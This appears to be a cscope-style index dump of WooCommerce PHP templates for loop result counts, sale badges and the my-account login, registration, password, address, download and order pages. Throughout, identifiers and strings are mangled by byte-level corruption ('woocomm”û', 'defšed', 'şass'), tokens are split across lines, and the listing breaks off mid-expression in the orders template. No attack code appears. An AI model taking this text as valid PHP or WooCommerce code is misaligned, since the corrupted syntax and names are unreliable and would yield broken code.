; ?>

	@templates/loop/result-count.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
glob®
 
	g$woocomm”û
, 
	g$wp_qu”y
;

16 iàĞ! 
	$woocomm”û_´oduùs_wl_di¥Ïy
() )

19 <
p
 
şass
="woocommerce-result-count">

20 <?
php


21 
$·ged
 = 
	`max
Ğ1, 
$wp_qu”y
->
	`g‘
( 'paged' ) );

22 
$³r_·ge
 = 
$wp_qu”y
->
	`g‘
( 'posts_per_page' );

23 
$tÙ®
 = 
$wp_qu”y
->
found_po¡s
;

24 
$fœ¡
 = ( 
$³r_·ge
 * 
$·ged
 ) - $per_page + 1;

25 
$Ï¡
 = 
	`mš
Ğ
$tÙ®
, 
$wp_qu”y
->
	`g‘
Ğ'po¡s_³r_·ge' ) * 
$·ged
 );

27 iàĞ1 =ğ
$tÙ®
 ) {

28 
	`_e
( 'Showinghe single„esult', 'woocommerce' );

29 
	}
} 
–£if
 ( 
$tÙ®
 <ğ
$³r_·ge
 || -1 == $per_page ) {

30 
´štf
Ğ
__
Ğ'Showšg‡Î %d„esuÉs', 'woocomm”û' ), 
$tÙ®
 );

32 
´štf
Ğ
_x
Ğ'Showšg %1$dâ€“%2$d oà%3$d„esuÉs', '%1$d = fœ¡, %2$d =†a¡, %3$d =Ù®', 'woocomm”û' ), 
$fœ¡
, 
$Ï¡
, 
$tÙ®
 );

35 </
	gp
>

	@templates/loop/sale-flash.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$po¡
, 
	g$´oduù
;

14 <?
php
 iàĞ
	g$´oduù
->
	$is_Ú_§Ë
() ) : ?>

16 <?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_§Ë_æash', '<¥ª cÏss="Ú§Ë">' . 
	`__
Ğ'S®e!', 'woocomm”û' ) . '</¥ª>', 
$po¡
, 
$´oduù
 ); ?>

18 <?
php
 
’dif
; ?>

	@templates/myaccount/form-add-payment-method.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

14 <
fÜm
 
	gid
="add_·ym’t_m‘hod" 
m‘hod
="post">

15 <
div
 
id
="payment">

16 <
ul
 
şass
="payment_methods methods">

17 <?
php


18 iàĞ
$avaabË_g©eways
 = 
WC
()->
·ym’t_g©eways
->
	$g‘_avaabË_·ym’t_g©eways
() ) {

20 iàĞĞ
$avaabË_g©eways
 ) )

21 
	`cu¼’t
Ğ
$avaabË_g©eways
 )->
	`£t_cu¼’t
();

23 
	`fÜ—ch
 ( 
$avaabË_g©eways
 
as
 
$g©eway
 ) {

25 <
li
 
şass
="payment_method_<?phpƒcho $gateway->id; ?>">

26 <
šput
 
id
="·ym’t_m‘hod_<?ph°echØ$g©eway->id; ?>" 
ty³
="¿dio" 
şass
="šput-¿dio" 
Çme
="·ym’t_m‘hod" 
v®ue
="<?ph°echØesc_©ŒĞ$g©eway->id ); ?>" <?
php
 
	`checked
Ğ
$g©eway
->
cho£n
, 
Œue
 ); ?> />

27 <
Ïb–
 ="·ym’t_m‘hod_<?ph°echØ$g©eway->id; ?>"><?
php
 
echo
 
$g©eway
->
	`g‘_t™Ë
(); ?> <?ph°echØ$g©eway->
	`g‘_icÚ
(); ?></label>

28 <?
php


29 iàĞ
$g©eway
->
	`has_f›lds
(è|| $g©eway->
	`g‘_desütiÚ
() ) {

30 
echo
 '<div cÏss="·ym’t_box…aym’t_m‘hod_' . 
$g©eway
->
id
 . '" style="display:none;">';

31 
$g©eway
->
	`·ym’t_f›lds
();

32 
echo
 '</div>';

35 </
li
>

36 <?
php


38 
	}
} {

40 
	gecho
 '<p>' . 
__
( 'Sorry, it seemshathere‡re‚o…ayment methods which support‡dding‡‚ew…ayment method. Please contact us if you„equire‡ssistance or wisho make‡lternate‡rrangements.', 'woocommerce' ) . '</p>';

44 </
	gul
>

46 <
div
 
	gşass
="form-row">

47 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-add-payment-method' ); ?>

48 <
šput
 
	gty³
="subm™" 
şass
="bu‰Ú‡É" 
id
="¶aû_Üd”" 
v®ue
="<?php _e( 'Add Payment Method', 'woocommerce' ); ?>" />

49 <
šput
 
ty³
="hidd’" 
Çme
="woocomm”û_add_·ym’t_m‘hod" 
v®ue
="1" />

50 </
div
>

52 </
div
>

54 </
fÜm
>

	@templates/myaccount/form-change-password.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

15 <?
php
 
wc_´št_nÙiûs
(); ?>

17 <
fÜm
 
	gaùiÚ
="<?ph°echØesc_u¾Ğg‘_³rm®škĞwc_g‘_·ge_idĞ'chªge_·sswÜd' ) ) ); ?>" 
m‘hod
="post">

19 <
p
 
şass
="form-row form-row-first">

20 <
Ïb–
 ="·sswÜd_1"><?
php
 
_e
Ğ'New…asswÜd', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

21 <
šput
 
ty³
="·sswÜd" 
şass
="šput-‹xt" 
Çme
="·sswÜd_1" 
id
="password_1" />

22 </
p
>

23 <
p
 
şass
="form-row form-row-last">

24 <
Ïb–
 ="·sswÜd_2"><?
php
 
_e
Ğ'Re-’‹¸Ãw…asswÜd', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

25 <
šput
 
ty³
="·sswÜd" 
şass
="šput-‹xt" 
Çme
="·sswÜd_2" 
id
="password_2" />

26 </
p
>

27 <
div
 
şass
="clear"></div>

29 <
p
><
šput
 
ty³
="subm™" 
şass
="bu‰Ú" 
Çme
="chªge_·sswÜd" 
v®ue
="<?php _e( 'Save', 'woocommerce' ); ?>" /></p>

31 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-change_password' ); ?>

32 <
šput
 
	gty³
="hidd’" 
Çme
="aùiÚ" 
v®ue
="change_password" />

34 </
fÜm
>

	@templates/myaccount/form-edit-account.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

15 <?
php
 
wc_´št_nÙiûs
(); ?>

17 <
fÜm
 
	gaùiÚ
="" 
m‘hod
="post">

19 <
p
 
şass
="form-row form-row-first">

20 <
Ïb–
 ="accouÁ_fœ¡_Çme"><?
php
 
_e
Ğ'Fœ¡‚ame', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

21 <
šput
 
ty³
="‹xt" 
şass
="šput-‹xt" 
Çme
="accouÁ_fœ¡_Çme" 
id
="accouÁ_fœ¡_Çme" 
v®ue
="<?phpƒsc_attr_e( $user->first_name ); ?>" />

22 </
p
>

23 <
p
 
şass
="form-row form-row-last">

24 <
Ïb–
 ="accouÁ_Ï¡_Çme"><?
php
 
_e
Ğ'La¡‚ame', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

25 <
šput
 
ty³
="‹xt" 
şass
="šput-‹xt" 
Çme
="accouÁ_Ï¡_Çme" 
id
="accouÁ_Ï¡_Çme" 
v®ue
="<?phpƒsc_attr_e( $user->last_name ); ?>" />

26 </
p
>

27 <
p
 
şass
="form-row form-row-wide">

28 <
Ïb–
 ="accouÁ_ema"><?
php
 
_e
Ğ'Ema‡dd»ss', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

29 <
šput
 
ty³
="ema" 
şass
="šput-‹xt" 
Çme
="accouÁ_ema" 
id
="accouÁ_ema" 
v®ue
="<?phpƒsc_attr_e( $user->user_email ); ?>" />

30 </
p
>

31 <
p
 
şass
="form-row form-row-first">

32 <
Ïb–
 ="·sswÜd_1"><?
php
 
_e
Ğ'PasswÜd (ËavbÏnkØËavunchªged)', 'woocomm”û' ); ?></
	gÏb–
>

33 <
šput
 
	gty³
="·sswÜd" 
şass
="šput-‹xt" 
Çme
="·sswÜd_1" 
id
="password_1" />

34 </
p
>

35 <
p
 
şass
="form-row form-row-last">

36 <
Ïb–
 ="·sswÜd_2"><?
php
 
_e
Ğ'CÚfœm‚ew…asswÜd', 'woocomm”û' ); ?></
	gÏb–
>

37 <
šput
 
	gty³
="·sswÜd" 
şass
="šput-‹xt" 
Çme
="·sswÜd_2" 
id
="password_2" />

38 </
p
>

39 <
div
 
şass
="clear"></div>

41 <
p
><
šput
 
ty³
="subm™" 
şass
="bu‰Ú" 
Çme
="§ve_accouÁ_d‘as" 
v®ue
="<?php _e( 'Save changes', 'woocommerce' ); ?>" /></p>

43 <?
php
 
wp_nÚû_f›ld
( 'save_account_details' ); ?>

44 <
šput
 
	gty³
="hidd’" 
Çme
="aùiÚ" 
v®ue
="save_account_details" />

45 </
fÜm
>

	@templates/myaccount/form-edit-address.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

14 
glob®
 
	g$cu¼’t_u£r
;

16 
	g$·ge_t™Ë
 = ( 
$lßd_add»ss
 ==ğ'blšg' ) ? 
__
( 'Billing Address', 'woocommerce' ) : __( 'Shipping Address', 'woocommerce' );

18 
g‘_cu¼’tu£ršfo
();

21 <?
php
 
wc_´št_nÙiûs
(); ?>

23 <?
php
 iàĞ! 
	g$lßd_add»ss
 ) : ?>

25 <?
php
 
wc_g‘_‹m¶©e
( 'myaccount/my-address.php' ); ?>

27 <?
php
 : ?>

29 <
fÜm
 
m‘hod
="post">

31 <
h3
><?
php
 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_ed™_add»ss_t™Ë', 
$·ge_t™Ë
 ); ?></
	gh3
>

33 <?
php
 
fÜ—ch
 ( 
$add»ss
 
as
 
$key
 => 
$f›ld
 ) : ?>

35 <?
php
 
woocomm”û_fÜm_f›ld
Ğ
$key
, 
$f›ld
, ! 
em±y
Ğ
$_POST
[ $key ] ) ? 
	$wc_ş—n
Ğ
$_POST
[ 
$key
 ] ) : 
$f›ld
['value'] ); ?>

37 <?
php
 
’dfÜ—ch
; ?>

39 <
p
>

40 <
šput
 
ty³
="subm™" 
şass
="bu‰Ú" 
Çme
="§ve_add»ss" 
v®ue
="<?php _e( 'Save Address', 'woocommerce' ); ?>" />

41 <?
php
 
	`wp_nÚû_f›ld
( 'woocommerce-edit_address' ); ?>

42 <
šput
 
ty³
="hidd’" 
Çme
="aùiÚ" 
v®ue
="edit_address" />

43 </
p
>

45 </
fÜm
>

47 <?
php
 
’dif
; ?>

	@templates/myaccount/form-login.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

15 <?
php
 
wc_´št_nÙiûs
(); ?>

17 <?
php
 
do_aùiÚ
( 'woocommerce_before_customer_login_form' ); ?>

19 <?
php
 iàĞ
g‘_İtiÚ
( 'woocommerce_enable_myaccount_registration' ) === 'yes' ) : ?>

21 <
div
 
şass
="cŞ2-£t" 
id
="customer_login">

23 <
div
 
şass
="col-1">

25 <?
php
 
’dif
; ?>

27 <
	gh2
><?
php
 
_e
( 'Login', 'woocommerce' ); ?></h2>

29 <
fÜm
 
	gm‘hod
="po¡" 
şass
="login">

31 <?
php
 
do_aùiÚ
( 'woocommerce_login_form_start' ); ?>

33 <
p
 
	gşass
="form-row form-row-wide">

34 <
Ïb–
 ="u£ºame"><?
php
 
_e
Ğ'U£ºamÜƒma‡dd»ss', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

35 <
šput
 
ty³
="‹xt" 
şass
="šput-‹xt" 
Çme
="u£ºame" 
id
="username" />

36 </
p
>

37 <
p
 
şass
="form-row form-row-wide">

38 <
Ïb–
 ="·sswÜd"><?
php
 
_e
Ğ'PasswÜd', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

39 <
šput
 
şass
="šput-‹xt" 
ty³
="·sswÜd" 
Çme
="·sswÜd" 
id
="password" />

40 </
p
>

42 <?
php
 
do_aùiÚ
( 'woocommerce_login_form' ); ?>

44 <
p
 
	gşass
="form-row">

45 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-login' ); ?>

46 <
šput
 
	gty³
="subm™" 
şass
="bu‰Ú" 
Çme
="logš" 
v®ue
="<?php _e( 'Login', 'woocommerce' ); ?>" />

47 <
Ïb–
 ="»memb”me" 
şass
="inline">

48 <
šput
 
Çme
="»memb”me" 
ty³
="checkbox" 
id
="»memb”me" 
v®ue
="fÜev”" /> <?
php
 
_e
( 'Remember me', 'woocommerce' ); ?>

49 </
	gÏb–
>

50 </
	gp
>

51 <
p
 
	gşass
="lost_password">

52 <
a
 
h»f
="<?ph°echØesc_u¾Ğwc_lo¡·sswÜd_u¾(è); ?>"><?
php
 
_e
Ğ'Lo¡ you¸·sswÜd?', 'woocomm”û' ); ?></
	ga
>

53 </
	gp
>

55 <?
php
 
do_aùiÚ
( 'woocommerce_login_form_end' ); ?>

57 </
	gfÜm
>

59 <?
php
 iàĞ
g‘_İtiÚ
( 'woocommerce_enable_myaccount_registration' ) === 'yes' ) : ?>

61 </
div
>

63 <
div
 
şass
="col-2">

65 <
h2
><?
php
 
_e
Ğ'Regi¡”', 'woocomm”û' ); ?></
	gh2
>

67 <
fÜm
 
	gm‘hod
="po¡" 
şass
="register">

69 <?
php
 
do_aùiÚ
( 'woocommerce_register_form_start' ); ?>

71 <?
php
 iàĞ'no' ==ğ
g‘_İtiÚ
( 'woocommerce_registration_generate_username' ) ) : ?>

73 <
p
 
şass
="form-row form-row-wide">

74 <
Ïb–
 ="»g_u£ºame"><?
php
 
_e
Ğ'U£ºame', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

75 <
šput
 
ty³
="‹xt" 
şass
="šput-‹xt" 
Çme
="u£ºame" 
id
="»g_u£ºame" 
v®ue
="<?php if ( !ƒmpty( $_POST['username'] ) )ƒchoƒsc_attr( $_POST['username'] ); ?>" />

76 </
p
>

78 <?
php
 
’dif
; ?>

80 <
p
 
	gşass
="form-row form-row-wide">

81 <
Ïb–
 ="»g_ema"><?
php
 
_e
Ğ'Ema‡dd»ss', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

82 <
šput
 
ty³
="ema" 
şass
="šput-‹xt" 
Çme
="ema" 
id
="»g_ema" 
v®ue
="<?php if ( !ƒmpty( $_POST['email'] ) )ƒchoƒsc_attr( $_POST['email'] ); ?>" />

83 </
p
>

85 <?
php
 iàĞ'no' ==ğ
g‘_İtiÚ
( 'woocommerce_registration_generate_password' ) ) : ?>

87 <
p
 
şass
="form-row form-row-wide">

88 <
Ïb–
 ="»g_·sswÜd"><?
php
 
_e
Ğ'PasswÜd', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

89 <
šput
 
ty³
="·sswÜd" 
şass
="šput-‹xt" 
Çme
="·sswÜd" 
id
="»g_·sswÜd" 
v®ue
="<?php if ( !ƒmpty( $_POST['password'] ) )ƒchoƒsc_attr( $_POST['password'] ); ?>" />

90 </
p
>

92 <?
php
 
’dif
; ?>

94 <!-- 
S·m
 
	gT¿p
 -->

95 <
div
 
	g¡yË
="Ëá:-999em;…os™iÚ:absŞu‹;"><
Ïb–
 ="Œ­"><?
php
 
_e
Ğ'AÁi-¥am', 'woocomm”û' ); ?></
	gÏb–
><
šput
 
	gty³
="‹xt" 
Çme
="ema_2" 
id
="Œ­" 
bšdex
="-1" /></div>

97 <?
php
 
do_aùiÚ
( 'woocommerce_register_form' ); ?>

98 <?
php
 
do_aùiÚ
( 'register_form' ); ?>

100 <
p
 
	gşass
="form-row">

101 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-register', 'register' ); ?>

102 <
šput
 
	gty³
="subm™" 
şass
="bu‰Ú" 
Çme
="»gi¡”" 
v®ue
="<?php _e( 'Register', 'woocommerce' ); ?>" />

103 </
p
>

105 <?
php
 
do_aùiÚ
( 'woocommerce_register_form_end' ); ?>

107 </
	gfÜm
>

109 </
	gdiv
>

111 </
	gdiv
>

112 <?
php
 
	g’dif
; ?>

114 <?
php
 
do_aùiÚ
( 'woocommerce_after_customer_login_form' ); ?>

	@templates/myaccount/form-lost-password.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

15 <?
php
 
wc_´št_nÙiûs
(); ?>

17 <
fÜm
 
	gm‘hod
="po¡" 
şass
="lost_reset_password">

19 <?
php
 ifĞ'lo¡_·sswÜd' =ğ
$¬gs
['form'] ) : ?>

21 <
p
><?
php
 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_lo¡_·sswÜd_mes§ge', 
__
Ğ'Lo¡ you¸·sswÜd? PËa£ƒÁ” you¸u£ºamÜƒma‡dd»ss. You wÈ»ûiv¨lškØü—‹‡‚ew…asswÜd vŸƒma.', 'woocomm”û' ) ); ?></
	gp
>

23 <
p
 
	gşass
="fÜm-row fÜm-row-fœ¡"><
Ïb–
 ="u£r_logš"><?
php
 
_e
Ğ'U£ºamÜƒma', 'woocomm”û' ); ?></
	gÏb–
> <
šput
 cÏss="šput-‹xt" 
ty³
="‹xt" 
Çme
="u£r_logš" 
id
="user_login" /></p>

25 <?
php
 : ?>

27 <
p
><?
php
 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_»£t_·sswÜd_mes§ge', 
__
Ğ'EÁ”‡‚ew…asswÜd b–ow.', 'woocomm”û'è); ?></
	gp
>

29 <
p
 
	gşass
="form-row form-row-first">

30 <
Ïb–
 ="·sswÜd_1"><?
php
 
_e
Ğ'New…asswÜd', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

31 <
šput
 
ty³
="·sswÜd" 
şass
="šput-‹xt" 
Çme
="·sswÜd_1" 
id
="password_1" />

32 </
p
>

33 <
p
 
şass
="form-row form-row-last">

34 <
Ïb–
 ="·sswÜd_2"><?
php
 
_e
Ğ'Re-’‹¸Ãw…asswÜd', 'woocomm”û' ); ?> <
¥ª
 
	gşass
="required">*</span></label>

35 <
šput
 
ty³
="·sswÜd" 
şass
="šput-‹xt" 
Çme
="·sswÜd_2" 
id
="password_2" />

36 </
p
>

38 <
šput
 
ty³
="hidd’" 
Çme
="»£t_key" 
v®ue
="<?phpƒcho isset( $args['key'] ) ? $args['key'] : ''; ?>" />

39 <
šput
 
ty³
="hidd’" 
Çme
="»£t_logš" 
v®ue
="<?phpƒcho isset( $args['login'] ) ? $args['login'] : ''; ?>" />

41 <?
php
 
’dif
; ?>

43 <
div
 
	gşass
="clear"></div>

45 <
p
 
şass
="fÜm-row"><
šput
 
ty³
="subm™" cÏss="bu‰Ú" 
Çme
="wc_»£t_·sswÜd" 
v®ue
="<?phpƒcho 'lost_password' == $args['form'] ? __( 'Reset Password', 'woocommerce' ) : __( 'Save', 'woocommerce' ); ?>" /></p>

46 <?
php
 
wp_nÚû_f›ld
Ğ
$¬gs
['form'] ); ?>

48 </
	gfÜm
>

	@templates/myaccount/my-account.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

14 
wc_´št_nÙiûs
(); ?>

16 <
p
 
	gşass
="myaccount_user">

17 <?
php


18 
´štf
(

19 
__
( 'Hello <strong>%1$s</strong> (not %1$s? <a href="%2$s">Sign out</a>).', 'woocommerce' ) . ' ',

20 
$cu¼’t_u£r
->
di¥Ïy_Çme
,

21 
wp_logout_u¾
Ğ
g‘_³rm®šk
Ğ
wc_g‘_·ge_id
( 'myaccount' ) ) )

24 
´štf
Ğ
__
( 'From your‡ccount dashboard you can view your„ecent orders, manage your shipping‡nd billing‡ddresses‡nd <a href="%s">edit your…assword‡nd‡ccount details</a>.', 'woocommerce' ),

25 
wc_cu¡om”_ed™_accouÁ_u¾
()

28 </
	gp
>

30 <?
php
 
do_aùiÚ
( 'woocommerce_before_my_account' ); ?>

32 <?
php
 
wc_g‘_‹m¶©e
( 'myaccount/my-downloads.php' ); ?>

34 <?
php
 
wc_g‘_‹m¶©e
Ğ'myaccouÁ/my-Üd”s.php', 
¬¿y
Ğ'Üd”_couÁ' => 
$Üd”_couÁ
 ) ); ?>

36 <?
php
 
wc_g‘_‹m¶©e
( 'myaccount/my-address.php' ); ?>

38 <?
php
 
do_aùiÚ
( 'woocommerce_after_my_account' ); ?>

	@templates/myaccount/my-address.php

1 <?
php


10 iàĞ! 
defšed
( 'ABSPATH' ) ) {

11 
	gex™
;

14 
	g$cu¡om”_id
 = 
g‘_cu¼’t_u£r_id
();

16 iàĞ
g‘_İtiÚ
( 'woocommerce_ship_to_billing_address_only' ) === 'no' && get_option( 'woocommerce_calc_shipping' ) !== 'no' ) {

17 
$·ge_t™Ë
 = 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_add»ss_t™Ë', 
__
( 'My Addresses', 'woocommerce' ) );

18 
	g$g‘_add»s£s
 = 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_g‘_add»s£s', 
¬¿y
(

19 'blšg' => 
__
( 'Billing Address', 'woocommerce' ),

20 'shpšg' => 
__
( 'Shipping Address', 'woocommerce' )

21 ), 
$cu¡om”_id
 );

23 
	g$·ge_t™Ë
 = 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_add»ss_t™Ë', 
__
( 'My Address', 'woocommerce' ) );

24 
	g$g‘_add»s£s
 = 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_g‘_add»s£s', 
¬¿y
(

25 'blšg' => 
__
( 'Billing Address', 'woocommerce' )

26 ), 
$cu¡om”_id
 );

29 
	g$cŞ
 = 1;

32 <
	gh2
><?
php
 
echo
 
	g$·ge_t™Ë
; ?></h2>

34 <
p
 
	gşass
="myaccount_address">

35 <?
php
 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_add»ss_desütiÚ', 
__
( 'The following‡ddresses will be used onhe checkout…age by default.', 'woocommerce' ) ); ?>

36 </
	gp
>

38 <?
php
 iàĞ
g‘_İtiÚ
Ğ'woocomm”û_sh_to_blšg_add»ss_Úly' ) ==ğ'no' && g‘_İtiÚĞ'woocomm”û_ÿlc_shpšg' ) !=ğ'no' ) 
echo
 '<div class="col2-set‡ddresses">'; ?>

40 <?
php
 
fÜ—ch
 ( 
$g‘_add»s£s
 
as
 
$Çme
 => 
$t™Ë
 ) : ?>

42 <
div
 
şass
="col-<?phpƒcho ( ( $col = $col * -1 ) < 0 ) ? 1 : 2; ?>‡ddress">

43 <
h—d”
 
şass
="title">

44 <
h3
><?
php
 
echo
 
$t™Ë
; ?></
	gh3
>

45 <
a
 
	gh»f
="<?ph°echØwc_g‘_’dpošt_u¾Ğ'ed™-add»ss', $Çm); ?>" 
şass
="ed™"><?
php
 
_e
Ğ'Ed™', 'woocomm”û' ); ?></
	ga
>

46 </
	gh—d”
>

47 <
	gadd»ss
>

48 <?
php


49 
	g$add»ss
 = 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_add»ss_fÜm©‹d_add»ss', 
¬¿y
(

50 'fœ¡_Çme' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_fœ¡_Çme', 
Œue
 ),

51 'Ï¡_Çme' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_Ï¡_Çme', 
Œue
 ),

52 'com·ny' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_com·ny', 
Œue
 ),

53 'add»ss_1' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_add»ss_1', 
Œue
 ),

54 'add»ss_2' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_add»ss_2', 
Œue
 ),

55 'c™y' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_c™y', 
Œue
 ),

56 '¡©e' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_¡©e', 
Œue
 ),

57 'po¡code' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_po¡code', 
Œue
 ),

58 'couÁry' => 
g‘_u£r_m‘a
Ğ
$cu¡om”_id
, 
$Çme
 . '_couÁry', 
Œue
 )

59 ), 
$cu¡om”_id
, 
$Çme
 );

61 
	g$fÜm©‹d_add»ss
 = 
WC
()->
couÁr›s
->
g‘_fÜm©‹d_add»ss
Ğ
$add»ss
 );

63 iàĞ! 
	g$fÜm©‹d_add»ss
 )

64 
_e
( 'You have‚ot set uphisype of‡ddress yet.', 'woocommerce' );

66 
echo
 
	g$fÜm©‹d_add»ss
;

68 </
	gadd»ss
>

69 </
	gdiv
>

71 <?
php
 
	g’dfÜ—ch
; ?>

73 <?
php
 iàĞ
g‘_İtiÚ
Ğ'woocomm”û_sh_to_blšg_add»ss_Úly' ) ==ğ'no' && g‘_İtiÚĞ'woocomm”û_ÿlc_shpšg' ) !=ğ'no' ) 
echo
 '</div>'; ?>

	@templates/myaccount/my-downloads.php

1 <?
php


12 iàĞ! 
defšed
( 'ABSPATH' ) ) {

13 
	gex™
;

16 iàĞ
	g$dowÆßds
 = 
WC
()->
cu¡om”
->
	$g‘_dowÆßdabË_´oduùs
() ) : ?>

18 <
h2
><?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_dowÆßds_t™Ë', 
	`__
( 'Available downloads', 'woocommerce' ) ); ?></h2>

20 <
ul
 
şass
="digital-downloads">

21 <?
php
 
	$fÜ—ch
 ( 
$dowÆßds
 
as
 
$dowÆßd
 ) : ?>

22 <
li
>

23 <?
php


24 
	`do_aùiÚ
Ğ'woocomm”û_avaabË_dowÆßd_¡¬t', 
$dowÆßd
 );

26 iàĞ
	`is_num”ic
Ğ
$dowÆßd
['downloads_remaining'] ) )

27 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_avaabË_dowÆßd_couÁ', '<¥ª cÏss="couÁ">' . 
	`¥rštf
Ğ
	`_n
Ğ'% dowÆßd„emaššg', '% dowÆßd »maššg', 
$dowÆßd
['downloads_remaining'], 'woocommerce' ), $download['downloads_remaining'] ) . '</span> ', $download );

29 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_avaabË_dowÆßd_lšk', '<¨h»f="' . 
	`esc_u¾
Ğ
$dowÆßd
['download_url'] ) . '">' . $download['download_name'] . '</a>', $download );

31 
	`do_aùiÚ
Ğ'woocomm”û_avaabË_dowÆßd_’d', 
$dowÆßd
 );

33 </
li
>

34 <?
php
 
’dfÜ—ch
; ?>

35 </
ul
>

37 <?
php
 
’dif
; ?>

	@templates/myaccount/my-orders.php

1 <?
php


12 iàĞ! 
defšed
( 'ABSPATH' ) ) {

13 
	gex™
;

16 
	g$cu¡om”_Üd”s
 = 
g‘_po¡s
Ğ
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_Üd”s_qu”y', 
¬¿y
(

17 'numb”po¡s' => 
$Üd”_couÁ
,

19 'm‘a_v®ue' => 
g‘_cu¼’t_u£r_id
(),

24 iàĞ
	g$cu¡om”_Üd”s
 ) : ?>

26 <
h2
><?
php
 
echo
 
­¶y_f‹rs
Ğ'woocomm”û_my_accouÁ_my_Üd”s_t™Ë', 
__
Ğ'ReûÁ Ord”s', 'woocomm”û' ) ); ?></
	gh2
>

28 <
bË
 
	gşass
="shop_table my_account_orders">

30 <
th—d
>

31 <
Œ
>

32 <
th
 
şass
="Üd”-numb”"><
¥ª
 cÏss="nobr"><?
php
 
_e
Ğ'Ord”', 'woocomm”û' ); ?></
	g¥ª
></
	gth
>

33 <
th
 
	gşass
="Üd”-d©e"><
¥ª
 
şass
="nobr"><?
php
 
_e
Ğ'D©e', 'woocomm”û' ); ?></
	g¥ª
></
	gth
>

34 <
th
 
	gşass
="Üd”-¡©us"><
¥ª
 
şass
="nobr"><?
php
 
_e
Ğ'Stus', 'woocomm”û' ); ?></
	g¥ª
></
	gth
>

35 <
th
 
	gşass
="Üd”-tÙ®"><
¥ª
 
şass
="nobr"><?
php
 
_e
Ğ'TÙ®', 'woocomm”û' ); ?></
	g¥ª
></
	gth
>

36 <
th
 
	gşass
="Üd”-aùiÚs">&
nb¥
;</
	gth
>

37 </
	gŒ
>

38 </
	gth—d
>

40 <
	gtbody
><?
php


41 
	$fÜ—ch
 ( 
$cu¡om”_Üd”s
 
as
 
$cu¡om”_Üd”
 ) {

42 
$Üd”
 = 
Ãw
 
	`WC_Ord”
();

44 
$Üd”
->
	`pİuÏ‹
Ğ
$cu¡om”_Üd”
 );

46 
$¡©us
 = 
	`g‘_‹rm_by
Ğ'¦ug', 
$Üd”
->
¡©us
, 'shop_order_status' );

47 
$™em_couÁ
 = 
$Üd”
->
	`g‘_™em_couÁ
();

49 ?><
Œ
 
şass
="order">

50 <
td
 
şass
="order-number">

51 <
a
 
h»f
="<?phpƒcho $order->get_view_order_url(); ?>">

52 <?
php
 
echo
 
$Üd”
->
	`g‘_Üd”_numb”
(); ?>

53 </
a
>

54 </
td
>

55 <
td
 
şass
="order-date">

56 <
time
 
d©‘ime
="<?ph°echØd©eĞ'Y-m-d', sŒtÙimeĞ$Üd”->Üd”_d©è); ?>" 
t™Ë
="<?ph°echØesc_©ŒĞ¡¹ÙimeĞ$Üd”->Üd”_d©è); ?>"><?
php
 
echo
 
	`d©e_i18n
Ğ
	`g‘_İtiÚ
Ğ'd©e_fÜm©' ), 
	`¡¹Ùime
Ğ
$Üd”
->
Üd”_d©e
 ) ); ?></time>

57 </
td
>

58 <
td
 
şass
="Üd”-¡©us" 
¡yË
="text-align:left; white-space:nowrap;">

59 <?
php
 
echo
 
	`ucfœ¡
Ğ
	`__
Ğ
$¡©us
->
Çme
, 'woocommerce' ) ); ?>

60 </
td
>

61 <
td
 
şass
="order-total">

62 <?
php
 
echo
 
	`¥rštf
Ğ
	`_n
